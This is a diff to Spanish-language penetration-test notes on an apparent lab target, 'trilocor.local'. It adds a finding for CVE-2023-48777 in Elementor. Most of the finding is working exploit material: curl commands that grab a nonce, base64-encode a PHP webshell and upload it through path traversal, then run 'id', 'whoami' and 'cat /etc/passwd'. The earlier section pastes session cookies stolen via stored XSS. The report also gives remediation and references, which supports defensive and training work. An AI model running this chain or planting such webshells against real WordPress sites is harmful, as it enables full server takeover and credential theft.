@@ -106,7 +106,7 @@ http://www.trilocor.local/index.php/wp-json/
 y
 http://www.trilocor.local/index.php/wp-json/wp/v2/
 
-## Stored XSS
+# Stored XSS
 
 **Paso 1 — Leer el contenido real del sitio.**
 En la home hay una sección "Leave your testimonial". Su código fuente revela el endpoint. Se obtiene de dos formas equivalentes:
@@ -159,3 +159,134 @@ Las cookies no tenían `HttpOnly`, por eso `document.cookie` pudo leerlas.
 Abrí Cookie-Editor y creé dos cookies nuevas, una por cada una:
 - Nombre: `wordpress_logged_in_828ff7d64a441f8aab6a0310bdcee6a9` → Valor: `web-editor|1782144468|7XpTu09NZe1UJuzI94TtiASxkRuxxlMuFXaOhvD81Ul|0fdf700a49698a0b069a57498190bc8e2e24330b62d2ffa335171acc79196817`
 - Nombre: `wordpress_828ff7d64a441f8aab6a0310bdcee6a9` → Valor: `web-editor|1782144468|7XpTu09NZe1UJuzI94TtiASxkRuxxlMuFXaOhvD81Ul|3d54c85847ebb860dfb379cf8b55d0df6e650a57b24ebc1adcbc23912fd627e2`
+
+# Hallazgo: Remote Code Execution vía importación de plantillas de Elementor (CVE-2023-48777)
+
+## Resumen
+
+|Campo|Detalle|
+|---|---|
+|**Componente afectado**|Plugin Elementor Website Builder **3.7.7**|
+|**Vulnerabilidad**|Subida de archivo arbitrario + Path Traversal → RCE|
+|**CVE**|CVE-2023-48777|
+|**CWE**|CWE-434 (Unrestricted Upload of File with Dangerous Type)|
+|**Severidad**|Crítica (CVSS 3.1: 9.9)|
+|**Privilegio requerido**|Autenticado, rol **Contributor o superior**|
+|**Host**|`admin.trilocor.local`|
+|**Versión corregida**|Elementor ≥ 3.18.2|
+
+La función de importación de plantillas de Elementor procesa un parámetro `fileData` (contenido en Base64) y lo escribe en disco usando el nombre indicado en `fileName`. Dado que `fileName` no valida secuencias de path traversal, un atacante autenticado con permisos de edición de posts puede escribir un archivo PHP arbitrario en una ruta web-accesible y ejecutarlo, obteniendo RCE como el usuario del servidor web (`www-data`).
+
+---
+
+## Prerrequisito
+
+Se requiere una sesión autenticada con rol **Editor** (cumple el umbral Contributor+). En esta evaluación dicha sesión se obtuvo previamente mediante un **Stored XSS en el plugin a medida `secure_testimonials`**, que permitió robar la cookie de sesión del usuario `web-editor` (ver hallazgo correspondiente). Las cookies utilizadas a continuación son las de esa sesión.
+
+---
+
+## Pasos de reproducción
+
+> Reemplazar `MI_IP` por la IP del atacante en la VPN y `COOKIE` por la cookie de sesión válida de `web-editor` (obtenible del navegador en DevTools → Cookies, o vía el robo de cookie por XSS).
+
+### 1. Definir la sesión autenticada
+
+```bash
+COOKIE='wordpress_logged_in_828ff7d64a441f8aab6a0310bdcee6a9=<VALOR>; wordpress_828ff7d64a441f8aab6a0310bdcee6a9=<VALOR>'
+```
+
+### 2. Obtener el nonce de Elementor
+
+Elementor publica el nonce para sus llamadas AJAX en la configuración embebida de cualquier página del editor. Se extrae con la sesión autenticada:
+
+```bash
+NONCE=$(curl -s -b "$COOKIE" 'http://admin.trilocor.local/wp-admin/post.php?post=22&action=elementor' \
+  | grep -oP '"ajax":\{"url":"[^"]+","nonce":"\K[a-z0-9]+')
+echo "Nonce: $NONCE"
+```
+
+Salida esperada (ejemplo):
+
+```
+Nonce: d0cab1a2f0
+```
+
+### 3. Preparar el webshell en Base64
+
+```bash
+PAYLOAD=$(echo -n '<?php system($_GET[0]); ?>' | base64)
+```
+
+### 4. Subir el webshell mediante el importador vulnerable
+
+La petición se envía como POST `application/x-www-form-urlencoded` (no es un upload multipart). El archivo se escribe en el directorio temporal de Elementor; con `fileName=/../shell.php` el traversal lo deja en `wp-content/uploads/elementor/tmp/shell.php`.
+
+```bash
+curl -s -i -b "$COOKIE" 'http://admin.trilocor.local/wp-admin/admin-ajax.php' \
+  --data-urlencode 'action=elementor_library_direct_actions' \
+  --data-urlencode "_nonce=$NONCE" \
+  --data-urlencode 'library_action=import_template' \
+  --data-urlencode 'fileName=/../shell.php' \
+  --data-urlencode "fileData=$PAYLOAD"
+```
+
+**Resultado esperado:** `HTTP/1.1 500 Internal Server Error`.
+
+> Nota: el 500 es la señal de éxito. El servidor escribe el archivo correctamente y luego falla al intentar procesar el contenido como una plantilla válida; ese error posterior produce el 500, pero el `.php` ya quedó en disco.
+
+### 5. Confirmar la ejecución remota de código
+
+```bash
+curl 'http://admin.trilocor.local/wp-content/uploads/elementor/tmp/shell.php?0=id'
+```
+
+**Prueba (salida obtenida):**
+
+```
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+```
+
+El webshell queda accesible **sin necesidad de autenticación**, y permite ejecutar comandos arbitrarios pasándolos por el parámetro `0`, por ejemplo:
+
+```bash
+curl 'http://admin.trilocor.local/wp-content/uploads/elementor/tmp/shell.php?0=whoami'
+curl --data-urlencode '0=cat /etc/passwd' ...   # (o vía GET URL-encodeado)
+```
+
+---
+
+## Notas de ajuste del path traversal
+
+El directorio temporal real es un subdirectorio aleatorio dentro de `wp-content/uploads/elementor/tmp/`. La cantidad de `../` en `fileName` determina dónde aterriza el archivo:
+
+|`fileName`|Ruta resultante|
+|---|---|
+|`/../shell.php`|`wp-content/uploads/elementor/tmp/shell.php`|
+|`/../../shell.php`|`wp-content/uploads/elementor/shell.php`|
+|`shell.php` (sin traversal)|dentro del subdirectorio aleatorio de `tmp/`|
+
+Si una ruta devuelve 404, reintentar la subida (paso 4) y solicitar el archivo inmediatamente, ya que los archivos temporales pueden ser eliminados automáticamente.
+
+---
+
+## Impacto
+
+Compromiso total del servidor web. Un usuario con privilegios mínimos de edición (Editor/Contributor) obtiene ejecución de comandos como `www-data`, lo que habilita: lectura de `wp-config.php` y credenciales de base de datos, lectura de la flag, establecimiento de una reverse shell y enumeración para escalada de privilegios local.
+
+---
+
+## Remediación
+
+- **Actualizar Elementor a la versión 3.18.2 o superior**, donde la subida arbitraria y el path traversal están corregidos.
+- Aplicar el principio de mínimo privilegio: revisar qué roles tienen acceso a Elementor.
+- Configurar el servidor para **impedir la ejecución de PHP dentro de `wp-content/uploads/`** (regla en Apache/Nginx que deniegue `*.php` en esa ruta).
+- Reforzar el control de versiones de plugins y un proceso de parcheo periódico.
+
+---
+
+## Referencias
+
+- CVE-2023-48777 — Wordfence: _Elementor ≤ 3.18.1 — Authenticated (Contributor+) Arbitrary File Upload to RCE via Template Import_
+- WPScan Vulnerability Database: `a6b3b14c-f06b-4506-9b88-854f155ebca9`
+- Patchstack — _Critical Vulnerability in Elementor Affecting 5+ Million Websites_
+- Investigador original: Hồng Quân (2023-12-06)
